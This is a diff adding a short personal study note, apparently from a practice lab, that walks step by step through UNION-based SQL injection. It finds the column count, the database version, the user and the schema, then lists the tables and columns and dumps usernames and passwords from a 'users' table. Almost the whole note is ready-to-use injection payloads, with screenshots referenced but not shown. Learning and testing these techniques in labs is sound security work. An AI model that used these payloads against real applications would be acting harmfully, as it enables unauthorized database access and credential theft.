@@ -1,0 +1,61 @@
+Determine the number of columns:
+
+```sql
+1' union select 1,2 -- -
+```
+
+![[Pasted image 20241103115404.png]]
+
+View the version number:
+
+```sql
+1' union select 1,@@version -- -
+```
+
+![[Pasted image 20241103115433.png]]
+
+Find user db is running under:
+
+```sql
+1' union select 1,(select user()) -- -
+```
+
+![[Pasted image 20241103115458.png]]
+
+Find database name:
+
+```sql
+1' union select 1,(SELECT database()) -- -
+```
+
+![[Pasted image 20241103115516.png]]
+
+Find all tables available within working database:
+
+```sql
+1 'union select table_name , null from information_schema.tables -- - 
+```
+
+![[Pasted image 20241103115606.png]]
+
+To view the columns for the table users:
+```sql
+1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -
+```
+![[Pasted image 20241103115644.png]]
+
+To extract the data from the username and password column:
+
+```sql
+1 ' UNION SELECT user, password FROM users -- -
+```
+
+![[Pasted image 20241103115658.png]]
+
+Or to display usernames and password on a single line:
+
+```bash
+1' union select null,CONCAT(user,':',password) FROM users -- - 
+```
+
+![[Pasted image 20241103115934.png]]
